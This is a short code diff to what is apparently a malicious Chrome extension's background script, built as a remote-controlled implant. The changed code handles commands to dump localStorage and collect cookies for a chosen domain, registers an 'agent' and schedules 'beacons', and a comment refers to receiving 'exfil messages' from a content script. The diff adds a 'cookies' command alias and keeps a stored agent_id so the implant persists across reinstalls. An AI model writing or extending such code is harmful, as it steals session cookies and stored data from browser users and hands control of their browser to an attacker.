@@ -199,6 +199,7 @@ async function handleCommand(command) {
       broadcastMessage({ command: 'localStorageDump' });
       break;
 
+    case 'cookies':
     case 'getcookies':
       const domain = command.payload?.domain || null;
       await getCookiesForDomain(domain);
@@ -330,8 +331,16 @@ chrome.runtime.onStartup.addListener(() => {
 
 // On extension install
 chrome.runtime.onInstalled.addListener(() => {
-  console.log('[onInstalled] Registering agent');
-  registerAgent();
+  console.log('[onInstalled] Checking agent_id');
+  chrome.storage.local.get('agent_id', (res) => {
+    if (res.agent_id) {
+      agent_id = res.agent_id;
+      console.log(`[onInstalled] Reusing existing agent_id = ${agent_id}`);
+      scheduleNextBeacon();
+    } else {
+      registerAgent();
+    }
+  });
 });
 
 // Listen for exfil messages and other commands from content script
